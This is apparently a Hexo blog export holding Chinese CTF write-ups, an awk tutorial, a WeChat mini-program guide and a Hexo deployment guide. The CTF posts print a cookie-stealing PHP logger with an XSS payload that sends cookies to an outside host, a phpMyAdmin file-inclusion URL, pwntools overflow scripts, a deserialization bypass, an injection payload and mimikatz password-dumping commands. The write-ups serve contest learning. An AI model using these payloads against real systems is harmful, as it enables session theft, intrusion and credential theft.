$fp = fopen('cookie.txt', 'a'); fwrite($fp," IP: " .$ip. "\n Date and Time: " .$time. "\n User Agent:".$agent."\n Referer: ".$referer."\n Cookie: ".$cookie."\n\n\n"); fclose($fp); header("Location: http://www.baidu.com"); ?&gt;然后在link2处动下手脚，构造payload= http://120.78.185.175:5000/hachp1/love/index.php?greet=%3Cscript%3Ewindow.open(%22http://yourip/cookie.php?cookie=%22%2bdocument.cookie)%3C/script%3E然后在link1处填入提交即可，可能由于出题方服务器问题需要多试几次，总之我们得到flag如图：改变格式提交正确。Flagscuctf {l0v3_15_s0_w4rm}下一道稍难一点的Xss我怀疑有问题，已经构造出弹窗，真正测试的时候却没有cookie被记录，搞了很久结果都没搞出来。😭0x03 你好呀拿到网站，发现提示app.js.bak，于是访问它看到：很明显，这是node.js的一个CVE漏洞，经过查阅资料(参考链接：https://www.anquanke.com/post/id/85458 )，得知我们需要得到一个反射shell，于是根据https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py 提供的脚本，加上我们想要作为监听方的ip，可以构造：接着根据漏洞点，构造序列化字符串，并将其base64加密，得到：接下来就是抓包修改cookie的profile字段：开启监听后可以看到得到了反射shell：Flagscuctf{2602547F25B5C13D62F010230D917481}0x04 艾迪魔力转圈圈~拿到链接，发现需要先登录phpmyadmin，于是试了下密码123456，登录成功！发现了此版本是4.8.1：这不是可以任意文件包含的那个版本吗？？根据题目提示flag在根目录，于是马上执行查询，这条语句的效果是进入根目录再列出所有文件及文件夹:select ‘&lt;?php system(“cd /&amp;&amp; ls”)?&gt;’想要利用这个漏洞，需要session，接着我们拿到我们的session开始搞事情：接下来就是执行刚才的命令了，好在没有更改session位置：http://47.110.93.156:45786/pma/index.php?target=db_sql.php%253f%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fphp%2Fsessions%2Fsess_d338dj1h7ebsbtnmd47lah0fec26am5l 得到：可以看到我们已经成功得知flag的名字，于是构造查询：再刷新一下页面，得到flag：Flagscuctf{Phpmy4dm1n_1s_n0t_s4t3}Part5 Pwn这次的Pwn虽然只搞出一个，但是确实又是了解到了不少操作。0x01 babystack拿到二进制文件，checksec发现保护全开：然后IDA看一下，发现main()十分简单直白：程序逻辑是看v5与dword_202010异或是否为14649，其中dword_202010的值为：我们发现(14649=0x9011)^0x1a0a=0x2333!=(8960=0x2300),于是需要我们用buf覆盖v5的值为0x2333。接下来计算偏移量，可以看到buf到v5之间差了16字节，于是只要用16个垃圾字符填充，即可覆盖掉v5：上十分简单的脚本：from pwn import *p=remote('119.23.206.23',10001)payload='a'*16+p32(0x2333)p.send(payload)p.interactive()运行结果如图：Flagscuctf{f3035665-6614-43c3-a3ad-1ca46242c0fd}]]></content>
      <categories>
        <category>CTF比赛</category>
        <category>第一届SCUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从一道题看一类Pwn题:缓冲区溢出]]></title>
    <url>%2F2019%2F03%2F24%2F%E4%B8%80%E9%81%93%E5%85%A5%E9%97%A8Pwn%E9%A2%98%2F</url>
    <content type="text"><![CDATA[前言这道题可以说是pwn里面最最简单的一种，属于Hello World级别，我与它的交锋也经历了好几个月，曾经我已经快要解决掉它，但是还是没能发现其中玄机，这次终于get it！从IDA开始！我们首先拿到二进制文件，第一步当然先拿到IDA反编译一下，得到如图的结果：我们看到这里有三个主要的函数，我们分别另外两个函数看一下：至此，我们基本已经了解这道题的思路：输入一串值，使其覆盖函数返回地址，将其变为magic()的首地址。接着我们本地调试现在我们已经获知了关键信息，接下来我们使用gdb下的pwndbg调试这个二进制文件。需要注意的是，这个文件需要在ubuntu环境下调试，centos环境它无法执行，从而无法调试。之前我们已经提到需要下一个断点，于是调试结果如下：我们看到程序空出了一行让我们输入东西，我们随便输入点吧（不过貌似约定俗成的都输入a），这里我们输入十个a，然后查看栈顶rsp寄存器地址开始的内存，为了保险一点，直接往下查看40个地址：可以看到，十个a的值已经被写到内存了，我们继续单步执行，看这个函数返回值有没有在内存中出现：我们发现这个返回地址在上面输入十个a之后的内存值中出现过，于是我们只要输入足够多的a占满与这个内存地址之间的间隙，然后把这个内存地址填充为magic()首地址：0x0040067D即可。我们还得测试一下有没有差错，这次我们输入足够多的值（按键盘顺序，每个字母各输入4个，输入44个之后再输入两个），共46个字母，看此时的返回地址是什么：我们发现返回地址居然还加上了后八个字节，于是我们还需要多输入一个值：0x000000000.所以综上，payload=’a’*40+p32(0x0040067D)+p32(0x000000000).最后一步，使用脚本现在我们来到了最后一步，需要写脚本了。from pwn import *p=remote('120.78.66.77',10005)payload='a'*40+p32(0x0040067D)+p32(0x000000000)p.sendline(payload)p.interactive()我们只需要执行以上脚本即可得到远程主机使用权，顺利拿到flag:因为这里出题方设置了时限为30s，所以可能一行行敲代码会造成超时，从而没有成功，但是只要照上图，重新发送payload即可。总结通过解决这道题，可以说对Pwn这个东西多了一分了解，前路漫漫，还有很多难题亟待解决啊！p32()这个函数可以把二位ASCII码变成我们从键盘打印不出来的字符，这个函数完美解决了无法输入目的字符的难题。40对应的@可以打印，但比方说我们想要输入00对应的字符，但是我们从键盘是打不出来的，而打不出来就无法写入内存。所以我们还是需要借助脚本来完成内存地址覆盖，光想靠手工输入是不太可能的。]]></content>
      <categories>
        <category>心得小谈</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shell算法：转置文件]]></title>
    <url>%2F2019%2F03%2F17%2F%E8%BD%AC%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[描述力扣上看到这么一道题，假设 file.txt 文件内容如下：name agealice 21ryan 30应当输出：name alice ryanage 21 30嗯。。。怎么搞呢？？这就需要我们对Linux的一些命令有些了解了。这里我们使用awk命令。前置知识awk是啥？awk是一种优良的文本处理工具，它不仅是Linux中也是任何环境中现有的功能最强大的数据处理引擎之一。先来了解一下解决这个问题需要用到的awk里的指令：NF：这个表示的是字段总数；NR：这个表示的是所读文件的当前行数；$0：表示当前行的所有内容，比如print $0可以打印整行内容；$i：表示第i个字段；BEGIN,END：这两个个标识程序开始和结束。开始写！awk的shell格式是awk ‘{XXXX}’ filename，所以我们可以使用这样的命令:awk '&#123; for(i=1;i&lt;=NF;i++)&#123; if(NR==1)&#123; file[i]=$i #这里如果打印file[i],会发现是两行，第一行是name，第二行是age。和其它语言的数组打印格式不同 &#125;else&#123; file[i]=file[i] " " $i #因为输出要求有空格 &#125; &#125;&#125;END&#123; for(i=1;i&lt;=NF;i++)&#123; print file[i] &#125;&#125;' file.txt这里为了好看一些，排了个版，当然我们需要在终端直接输入一整行指令，存成文件也可以，不过估计得改一下文件路径：awk '&#123;for(i=1;i&lt;=NF;i++)&#123;if(NR==1)&#123;file[i]=$i&#125;else&#123;file[i]=file[i]" "$i&#125;&#125;&#125;END&#123;for(i=1;i&lt;=NF;i++) print file[i]&#125;' file.txt为什么这样写？现在来解释一下。我们知道file.txt有三行，每行两个字段，所以NF=2；如果文件只有一行，即NR=1的话，直接构造一个数组把字段存进去即可得到转置后的文件（注释里有，自己也可以试着打印一下）。得到NR=1是的file数组输出：nameage接着开始读取下一行，又重新开始循环，i=1，此时NR=2，所以执行else里面的代码，此时会在原有file数组里增加file.txt第二行的字段(file[i]=file[i] “ “ $i)，第一次循环：name aliceage 21至此，第二次循环后执行END结束里的指令，得到我们想要的输出。值得注意的是每次读完一行，都会这一行的开始读取字段,重新循环是一个点。]]></content>
      <categories>
        <category>心得小谈</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信小程序：哔哩哔哩新番时间表]]></title>
    <url>%2F2019%2F03%2F12%2F%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[源起最近由于被人问起，一时间心血来潮想到写一个微信小程序，于是就捣鼓了一个超级简单的小程序：哔哩哔哩新番时间表。开始！我们首先需要在微信公众平台注册一个账号，然后下载它的一个开发工具：微信开发者工具。这个软件在该平台可以下载。接着打开工具，使用微信登陆后，创建一个新项目，点击使用测试号即可。如图：了解小程序结构这里我得感谢一下梁老师，是他强制让我们使用Node.js开发网站，让我对于微信小程序开发有了一定的基础。微信小程序可以用Node.js开发，也能使用php，这里我们当然是用Node.js了，因为选择的测试号，开发工具没有提供php这个选项。好的，我们来看一下我这个小程序的目录结构：好的，这个wxml文件和wxss文件分别对应我们常见的的html和css文件，语法都是一样的。进入主题我们先找到哔哩哔哩的各种API，这里我直接给出我所用到的API：新番时间表：https://bangumi.bilibili.com/web_api/timeline_global番剧详情：https://bangumi.bilibili.com/ext/web_api/season_count?season_id=&#39;+this.data.id+&#39;&amp;season_type=1,这里this.data.id对应番剧的id；推荐番剧：https://api.bilibili.com/pgc/web/recommend/related/recommend?season_id= + this.data.id；当前在线人数及稿件数：http://api.bilibili.com/x/web-interface/online ,这个我调用失败了，我非常确定B站对这个API做了防盗链处理！说一下思路：请求API，分析返回的json，获取数据，传数据给wxml，wxss完成修饰效果，最后由微信完成渲染。app.js这是小程序的入口文件，我们直接调用API，不需要配置它。app.json这里配置小程序的名称，目录，颜色样式等等,代码如下：&#123; "pages": [ "pages/index/index", "pages/detail/detail" ], "window": &#123; "backgroundTextStyle": "dark", "navigationBarBackgroundColor": "#2196f3", "navigationBarTitleText": "哔哩哔哩新番时间表", "navigationBarTextStyle": "white", "enablePullDownRefresh": true &#125;&#125;现在我们来到index文件夹index.js这个文件定义的是主页的监听操作，如下：Page(&#123; data: &#123; setall:[], detail:[] &#125;, /** * 生命周期函数--监听页面加载 */ onLoad: function (options) &#123; &#125;, /** * 生命周期函数--监听页面初次渲染完成 */ onReady: function () &#123; &#125;, /** * 生命周期函数--监听页面显示 */ onShow: function () &#123; this.getstart() &#125;, /** * 生命周期函数--监听页面隐藏 */ onHide: function () &#123; &#125;, /** * 生命周期函数--监听页面卸载 */ onUnload: function () &#123; &#125;, /** * 页面相关事件处理函数--监听用户下拉动作 */ onPullDownRefresh: function () &#123; &#125;, /** * 页面上拉触底事件的处理函数 */ onReachBottom: function () &#123; &#125;, getstart()&#123; wx.request(&#123; url: 'https://bangumi.bilibili.com/web_api/timeline_global', success:(res) =&gt; &#123; this.setData(&#123; setall:res.data.result &#125;) &#125; &#125;) &#125;, /** * 跳转到详情页面 */ goToDetail(e)&#123; wx.navigateTo(&#123; url: '/pages/detail/detail?id='+e.target.dataset.id &#125;) &#125;&#125;)我们需要使用Page({})将整个文件涵盖，wx.request({})是请求一个url，然后会有一个response，我们就从这个response取数据。wx.navigateTo({})是和bindtap跳转结合使用的，在index.wxml中会提到。index.wxml这里就相当于html格式，先给出代码：&lt;!--pages/index/index.wxml--&gt; &lt;view id="stories-list" bindtap="goToDetail"&gt; &lt;block wx:for="&#123;&#123; setall &#125;&#125;" wx:key="item.date_ts"&gt; &lt;view id="time"&gt; &lt;text id="date"&gt;&#123;&#123;item.date&#125;&#125;号更新番剧：&lt;/text&gt; &lt;block wx:for="&#123;&#123;item.seasons&#125;&#125;" wx:key="stories.ep_id" wx:for-item="stories"&gt; &lt;view id="detail" data-id="&#123;&#123;stories.season_id&#125;&#125;"&gt; &lt;text id="&#123;&#123;stories.season_id&#125;&#125;" data-id="&#123;&#123;stories.season_id&#125;&#125;"&gt;&#123;&#123;stories.title&#125;&#125;&#123;&#123;stories.pub_index&#125;&#125;\n更新时间：&#123;&#123;stories.pub_time&#125;&#125;\n追番人数：&#123;&#123;stories.favorites&#125;&#125;人&lt;/text&gt; &lt;image src="&#123;&#123; stories.square_cover &#125;&#125;" data-id="&#123;&#123;stories.season_id&#125;&#125;"&gt;&lt;/image&gt; &lt;/view&gt; &lt;/block&gt; &lt;/view&gt; &lt;/block&gt; &lt;/view&gt;我们在index.js中定义了一个数组：setall，我们使用wx:for=”“来遍历它，这里&lt;view&gt;就相当于&lt;div&gt;标签。wx:key=”item.data_ts”(指定遍历唯一标识)是因为我们可以发现每一个数组中的元素的data_ts都是不同的，所以可以作为唯一标识(key)。这里的data_ts是请求了https://bangumi.bilibili.com/web_api/timeline_global 得到的response里的数据，不是凭空捏造的。这里的item代替了setall，相当于setall变成了item（换了个名字，小程序语法要求）如图：我们在index.js使用了代码：setall:res.data.result /*取得上图中的result赋给setall*/如此，我们就能得到外层数据，因为我们发现这里的response存在双重嵌套（可以自己访问这个API链接详细观察）。这么一来，我们就需要换名了。我们先使用item.seasons这个数组来循环，接着使用wx-for-item=”stories”将循环数组换成stories这个名字，接下来我们就能欢快地使用它得到某一天所有的更新番剧啦！接着由于我们使用了bindtap=”goToDetail”，需要为后端传一个番剧的id，来构造该番剧的链接，使用data-id=”“，便能在我们点击其所属标签域时把id值传回给后端。比如我们这里给img，text加上了data-id,如果只在text加上了data-id，那我们点击图片，就不会把id值传回给后端。我们在goToDetail()函数里使用e.target.dataset.id得到id值。index.wxss这个就相当于css，我这里用了弹性布局，显示效果好一点:/* pages/index/index.wxss */#date&#123; font-family: Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;&#125;#detail &#123; display: flex; padding: 20rpx; border-radius: 10rpx; margin: 20rpx 0; background: white; box-shadow: 0 3px 1px -2px rgba(0,0,0,.2), 0 2px 2px 0 rgba(0,0,0,.14), 0 1px 5px 0 rgba(0,0,0,.12);&#125;#detail text &#123; display: block; flex-grow: 1; font-size: 27rpx; margin-right: 30rpx;&#125;#detail image &#123; width: 120rpx; height: 120rpx;&#125;这个我就不多解释了，只要能正确得到数据，效果什么的永远也不慌。但是rpx=0.5px，这个得了解一下。index.json&#123; "usingComponents": &#123;&#125;&#125;这个没什么好说的，基本没用到。现在来到detail文件夹detail.js老办法，首先确定需要的变量，然后方法和index.js基本一样：Page(&#123; data: &#123; id: '', coins:'', danmakus:'', views:'', detail:[] &#125;, onLoad(option) &#123; /*这里获取传过来的id*/ if (option.id || option.query.id) &#123; this.data.id = option.id || option.query.id; &#125; &#125;, onShow() &#123; this.getDetail() &#125;, getDetail() &#123; wx.request(&#123; url: 'https://bangumi.bilibili.com/ext/web_api/season_count?season_id='+this.data.id+'&amp;season_type=1', success: (res) =&gt; &#123; this.setData(&#123; coins: res.data.result.coins, danmakus: res.data.result.danmakus, views: res.data.result.views &#125;), this.getRecommend() &#125; &#125;) &#125;, getRecommend()&#123; wx.request(&#123; url: 'https://api.bilibili.com/pgc/web/recommend/related/recommend?season_id=' + this.data.id, success: (res) =&gt; &#123; this.setData(&#123; detail:res.data.result &#125;) &#125; &#125;) &#125;&#125;)我们得注意一下获取id的方法！index.wxml&lt;!--pages/detail/detail.wxml--&gt;&lt;view id="top"&gt;&lt;!--&lt;text&gt;当前B站最新投稿：&#123;&#123;sub&#125;&#125;件;\n&lt;/text&gt;&lt;text&gt;当前B站在线总人数：&#123;&#123;online&#125;&#125;;\n&lt;/text&gt; API无法访问--&gt;&lt;text&gt;该番剧当前硬币总数：&#123;&#123;coins&#125;&#125;;\n&lt;/text&gt;&lt;text&gt;当前弹幕总数：&#123;&#123;danmakus&#125;&#125;;\n&lt;/text&gt;&lt;text&gt;当前播放总数：&#123;&#123;views&#125;&#125;;\n&lt;/text&gt;&lt;/view&gt;&lt;view id="comicRe"&gt;&lt;text id&gt;为您推荐以下番剧：&lt;/text&gt;&lt;/view&gt;&lt;view id="recommend" wx:for="&#123;&#123;detail&#125;&#125;" wx:key="season_id"&gt;&lt;text id="&#123;&#123;item.season_id&#125;&#125;"&gt;&#123;&#123;item.title&#125;&#125;&#123;&#123;item.new_ep.index_show&#125;&#125;&lt;/text&gt;&lt;image src="&#123;&#123;item.cover&#125;&#125;"&gt;&lt;/image&gt;&lt;/view &gt;有了以上的经验，相信这里的单循环比较简单了。detail.wxss/* pages/detail/detail.wxss */#recommend &#123; display: flex; padding: 20rpx; border-radius: 10rpx; margin: 20rpx 0; background: white; box-shadow: 0 3px 1px -2px rgba(0,0,0,.2), 0 2px 2px 0 rgba(0,0,0,.14), 0 1px 5px 0 rgba(0,0,0,.12);&#125;#recommend text &#123; display: block; flex-grow: 1; font-size: 27rpx; margin-right: 30rpx;&#125;#recommend image &#123; width: 120rpx; height: 120rpx;&#125;#top &#123; display:flex; padding: 20rpx; border-radius: 10rpx; margin: 20rpx 0; background: white; box-shadow: 0 3px 1px -2px rgba(0,0,0,.2), 0 2px 2px 0 rgba(0,0,0,.14), 0 1px 5px 0 rgba(0,0,0,.12);&#125;#top text &#123; display: block; flex-grow: 1; font-size: 27rpx; margin-right: 30rpx;&#125;#comicRe &#123; display:flex; padding: 20rpx; border-radius: 10rpx; margin: 20rpx 0; background: white; box-shadow: 0 3px 1px -2px rgba(0,0,0,.2), 0 2px 2px 0 rgba(0,0,0,.14), 0 1px 5px 0 rgba(0,0,0,.12);&#125;#comicRe text &#123; display: block; flex-grow: 1; font-size: 27rpx; margin-right: 30rpx;&#125;这里一样的布局方式。detail.json和index.json一样，用不上。让我们看一看效果！我们最好使用ipnone6测试小程序，测试效果如下:本来还想加入其它功能的，结果B站的API不公开。全得自己F12找，而且它的数据不是API能够得到的，于是就没办法做了。希望我以后能做出更多更好玩的小程序吧，现在事情还有点多。]]></content>
      <categories>
        <category>杂记</category>
        <category>微信小程序</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[攻防世界小记]]></title>
    <url>%2F2019%2F03%2F05%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%2F</url>
    <content type="text"><![CDATA[前言这里挑选了一些个人认为有价值的题目，当然，正在不断攻克中，会不断更新的(暂时只更新一个专题)。Miscembarrass这道题是一道流量分析题，首先拿到流量包，发现有点大266MB(太大了，就不放出来了)，估计有点东西，于是首先导出文件，发现有很多杂七杂八的东西，但是看过一遍后貌似没有什么有用的东东(比如压缩包啊啥的)？？嗯？？这么坑的吗？于是想到这种题多半是直接给了flag在字符串里面的，靠N多数据包来混淆我们，让我们难以直接发现,只能瞎找数据包，于是拖到虚拟机，输入命令：strings misc_02.pcapng | grep flagEmmmm，果然不出所料：看一看我们得到的导出文件，毫无L用。。：Reverse-it这道题有点难度，而且极具迷惑性。首先我们拿到题目，是一个二进制文件。先用010看一下，发现是二进制文件，既然“提示”我们要逆向它，那么我们就先用IDA分析一下，然而太菜了，什么都逆不出来。放到虚拟机运行一下试试看？报错！然而，Linux还是有用的，可能这里的逆向不是我们想象中的逆向，这里指的应该是把它反着输出一下？不管了，试试看！于是使用了一下命令：xxd -p Reverseit | tr -d '\n' | rev | xxd -r -p &gt; reversed这里解释一下这些是什么意思：‘|’: 比如a | b的意思是将a的输出作为b的输入；xxd -p filename表示把filename进行十六进制存储；tr -d ‘\n’表示删除换行符；rev表示把字符相反输出；xxd -r -p表示把十六进制转换成二进制；接着&gt; reversed表示将其存储为名称为reversed的文件。还没完，还要使用file命令确定一下reversed的类型：file reversed啊啊啊，看我们得到了什么！一张名为reversed图片！我们把图片内容反着输出就行了！第四FS扩展这道题又是给了一张图片，如下：这里的图片我压缩过了，原图片实在是太大了(12M)，看到这么大的图片肯定不正常，先用binwalk看一下再说，果然有一个压缩包，里面有一个file.txt，提取出来居然无法打开，WinRAR修复后发现里面的文件居然没了?彻底懵逼了，但是不信邪的我拿图片放到Linux下去binwalk了一下，居然发现结果多了一个ext-root文件夹，里面的压缩包居然是好的？？？密码当然就在图片的详细信息里啦，拿到file.txt,按照题目提示，当然得分析词频了，把词频按照脚本提取出来，得到flag。这里上个本题用到的分析词频的脚本。Webunserialize3首先我们拿到题目：我们看到只有一个变量，还有一个方法，以及提示了需要get一个参数code。题目名字又叫反序列化，于是想到该使用反序列化的方法。可是怎么入手呢？注意到__wakeup(),一旦调用了它，就会输出bad request，于是猜测需要绕过这个函数。怎么绕过呢？其实这个函数是反序列化操作中的一个魔法函数，许多魔法函数都有漏洞，这个应该也不例外，于是找到此漏洞,就是反序列化的时候,会检查是否存在__wakeup()这个函数，如果存在则优先调用。于是这道题就十分地明了了————绕过__wakeup()!通过查询漏洞，得知只要反序列化把对象属性个数搞错就能绕过此函数。于是可以构造如下payload：O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;解释一下这是什么意思：O(字母O)：表示对象(object)；4：表示对象名字长度(此处xctf长度是4)；接下来自然就是对象名字；2：表示对象里的属性个数，xctf里只有一个属性flag，但是为了绕过__wakeup(),把它从1改成了2；s：表示属性的类型；后面的数字表示长度；于是我们通过code传过去，得到flag：mfw拿到站点连接，得到如图网站：我们拿到提示，进去一看啥都没有。于是只能乱点导航栏，发现如下东东：我们发现了Git这个东西，于是我们访问如下链接：http://111.198.29.45:31911/.git/，得到：我统统看了一下，发现没有什么信息，但是唯独这个index，点击它，浏览器自动下载一个index文件，点击它用010打开发现了这个：嗯？既然提示这么明显了，我们试一下show_source()得到flag.php的源码：构造payload：&#39; and show_source(&#39;templates/flag.php&#39;) and &#39;我们发现会得到两条相同的flag，我们可以使用die()把show_source(‘templates/flag.php’)包含起来只输出一条flag。有时候得注意会过滤’和空格，分别换成%27和%20即可。未完待续！]]></content>
      <categories>
        <category>CTF训练</category>
        <category>攻防世界</category>
      </categories>
      <tags>
        <tag>CTF训练</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[腾讯云使用宝塔面板部署Hexo]]></title>
    <url>%2F2019%2F02%2F22%2F%E8%85%BE%E8%AE%AF%E4%BA%91%E9%83%A8%E7%BD%B2Hexo%2F</url>
    <content type="text"><![CDATA[前言在网上找了很多教程，但是基本没有使用宝塔Linux面板部署Hexo的，基本都是从命令行开始直接搞，但是这样并不直观，因此，我摸索出了使用宝塔面板部署Hexo的方法。使用宝塔面板部署，因为它已经帮我们安装好了nginx和git，不必我们自己手动安装。正式开始！配置Git！在这里，我购买完云服务器之后，就立马重装了宝塔Linux面板。为此，我们需要先重装一下系统。首先，进入云服务器控制台，选中一台实例，然后拉到最右边点击更多。如图所示：接着，按照如图所示选择宝塔面板版本，选择上海霹格这一款，貌似是腾讯云专门定制的，当然，选择其它的应该也行。最后，等待其安装完成，成功之后访问：ip:8888，配置好用户名与密码后即可进入你的宝塔面板。然后按照提示安装所需的nginx，等待安装完成即可。接着，我们在home文件夹下新建git，hexo这两个文件夹。随后，我们通过腾讯云或者xshell登录我们的实例，依次执行cd .. //这里是因为默认执行目录是root，需要返回根目录cd homecd gitgit init --bare hexoBlog.git接着，转到宝塔面板，进入/home/git/hexoBlog.git/hooks,然后新建一个文件：post-receive，不要后缀名。然后编辑它，加入如下两条代码：#!/bin/bashgit --work-tree=/home/hexo --git-dir=/home/git/hexoBlog.git checkout -f保存即可，接着转到已经登录的实例控制台，即xshell或者腾讯云控制台执行如下代码：chmod +x /home/git/hexoBlog.git/hooks/post-receive至此，git基本已经配置完成！配置Nginx！宝塔面板默认的nginx配置文件在根目录-&gt;www-&gt;serve-&gt;nginx-&gt;conf下，找到nginx.conf，编辑它，如图：接下来，重启nginx服务：service nginx restart本地Hexo配置找到本地Hexo站点配置文件_config.yml，进行如下更改：deploy: type: git repository: tencent: root@你的云服务器ip:/home/git/hexoBlog #如果你更改了ssh端口的话，需要改成: tencent: ssh://root@ip:端口号/home/git/hexoBlog如果你更改了ssh端口的话，需要大功告成！至此，只要在本地Hexo的git bash下执行：hexo cleanhexo g -d接着可能会提示你输入你的云服务器的密码，此处输入密码不会显示，复制粘贴完后直接回车即可，成功后访问你的域名或者ip就能看到你的Hexo博客了！最快速方法如果不使用以上方法配置nginx的话，可以直接在宝塔面板添加网站，填上域名，更改网站目录为你上传的目录，不必修改nginx主配置，可以避免以后可能的错误。当然，git的hooks那一步(即步骤二)还是需要执行的，这个方法只是不用人工修改nginx配置文件。这里可能出现的问题有：忘记解析域名到ip地址；虽然解析了ip，但是要注意的是有一定的延迟，当初我就是直接选择的这种方法，但是发现访问不了，就自己摸索了第一种办法，但是不久后我发现原来是解析延迟的问题，有点坑。这可以说这是非常快速的方法了。]]></content>
      <categories>
        <category>杂记</category>
        <category>腾讯云</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019HGAMEWP]]></title>
    <url>%2F2019%2F02%2F16%2FHGAMEWP%2F</url>
    <content type="text"><![CDATA[CryptoMix首先拿到的是一串摩斯电码：–…/….-/….-/-…/–…/…–/…../..-./-…./-../-…./..-./–…/—-./….-/….-/–…/.—-/-…./-…/–…/-…/-…./..—/…../.—-/-…./-…./…–/….-/…–/—–/-…./…../–…/-.. ，首先在线解密得到一串意味不明的东西：744B735F6D6F7944716B7B6251663430657D，于是试一下16进制转为text，于是居然得到：tKs_moyDqk{bQf40e}，很显然现在应该凯撒移位，但是不管怎么移，都得不到hgame{这个字段，于是看到题目名字为Mix，想到应该还有其它加密方式，前面发现移位可以得到：hYg_acmRey{pEt40s}，于是想到栅栏密码，在线解密，尝试得在每组字数为9时，得到flag：hgame{E4sY_cRypt0}。Vigener~这道题只给了一串密文：Zbi Namyrwjk wmhzk cw s eknlgv uz ifuxstlata edhnufwlow xwpz vc mkohk s kklmwk uz mflklagnkh Gswyuv uavbijk, huwwv uh xzw ryxlwxm sx s qycogxx. Ml ay u jgjs ij hgrsedhnufwlow wmtynmlmzcsf. Lny gahnyv ak kuwq lu orvwxmxsfj urv asjpwekhx, tmz cx jwycwlwj upd szniehzm xg txyec az zsj lnliw ukhxmjoyw, ozowl wsxhiv az nlw vkmgjavnmgf ry gzalzvw atxiuzozjjshfi. Ests twgvfi zsby xjakx xg asjpwekhx wfilchloir kunyqwk zbel sxy ikkkhxasrfc Namyrwjk wmhzklw. Af kckzlkyr kadnc lzxyi, Xjoyhjaib Oskomoa ogm xzw lcvkl zi tmtrcwz s myrwjgf qwlnih gx jygahnyvafm Pmywtyvw uojlwjy. Nlw Noaifwxy gahnyv osy ivayohedde xikuxcfwv hs Kagbur Tsznmklg Viddgms af ncw gfk nlgmyurv xopi zmtxvwv ghh xalnc-gfk vsgc Ru gaxxu hwd. Yck. Yaupef Tgnxakzu Fwdruwg, tan xzw ywlwek qek dgnij eomellxcfmlkx xg Trumkw jy Zaykhijw oh xzw tcrwln wiflalc sfj ms suwomjwj cxk hxywwfz heew. lfey ay ajqmenycpglmqqjzndhrqwpvhtaniz居然没给密钥，不过山人自有妙计，使用在线解密站点：http://68.168.134.3/vigener 可以实现无密钥解密，最终所得明文结果：The Vigenere ciphe is a method of encrypting alphabetic text by using a series of interwoven Caesar ciphers, based on the letters of a keyword. It is a form of polyalphabetic substitution. The cipher is easy to understand and implement, but it resisted all attempts to break it for three centuries, which earned it the description le chiffre indechiffrable. Many people have tried to implement encryption schemes that are essentially Vigenere ciphers. In eighteen sixty three, Friedrich Kasiski was the first to publish a general method of deciphering Vigenere ciphers. The Vigenere cipher was originally described by Giovan Battista Bellaso in his one thousand five hundred and fifty-one book La cifra del. Sig. Giovan Battista Bellaso, but the scheme was later misattributed to Blaise de Vigenere in the nineth century and so acquired its present name. flag is gfyuytukxariyydfjlplwsxdbzwvqtMiscAre You Familiar with DNS Records根据题目所提，应该需要查询一系列DNS，尝试了许久，复制链接地址;http://project-a11.club/ ,通过在线网站:https://tool.lu/dns/index.html 查询txt，得到flag。Broken Chest下载得到的是一个zip压缩包，打开提示错误，于是使用winhex打开，发现文件头被改了，改回后发现被加密了，于是看了一下发现是真的被加密了，然后使用winrar打开后居然直接给了密码，太良心了，原本以为要CRC爆破的。Hidden Image in LSB下载压缩文件，解压发现居然有一个lsb.py文件，还有一张png图片:原以为要用到py，结果只是使用stegsolve变换通道就出来了。Warmup首先解压下载压缩包，发现是一张打不开的1.gif图片，16进制分析下发现是MDMP文件，于是改为dmp后缀，使用mimikatz（这里直接百度下载一个就是）分析，使用命令：sekurlsa::minidump 1.dmp效果如下:sekurlsa::logonPasswords full发现密码:于是将密码LOSER使用SHA256加密一下得到：dd6dffcd56b77597157ac6c1beb514aa4c59d033098f806d88df89245824d3f5于是flag为：hgame{dd6dffcd56b77597157ac6c1beb514aa4c59d033098f806d88df89245824d3f5}暗藏玄机题目给了两张图片，猜测使用stegsolve结合图片，结果不是，于是猜测为盲水印攻击，bingo！题目所给图片如下：python bwm.py decode 开学啦.png 开学了.png s.png得到s.png，即为flag：hgame{h1de_in_THE_p1Cture}这里给出bwm.py文件：bwm.py需要注意的是使用此脚本需要先安装opencv库。初识二维码首先解压压缩包，看到一个文件flag.txt,查看一下发现是一种加密过的照片格式，使用在线网站base64转图片或者直接复制文件粘贴到浏览器网址处回车，就会得到一张二维码，如下：很明显，需要我们补全二维码。但是这里就很坑，和常规不一样，因为还要补定时码，而且定位码还要补在外面。。。由于没有注意二维码规格，导致补了很久都没有成功，最后终于成功了。。。如下：扫描即可得到flag：hgame{Qu1ck_ReSp0nse_cODe}。打字机解压压缩包，发现里面有flag.png和一张打字机图片，如下：开始看得我一脸懵逼，不懂为什么flag.png里面会出现打字机没有的字符，后来才知道居然是大小写的区别。看了一阵实在没办法，只得上谷歌搜图了，结果真搜出了好东西，有一篇文章专门讲了这个打字机：https://new.qq.com/omn/20180111/20180111G0TE4H.html 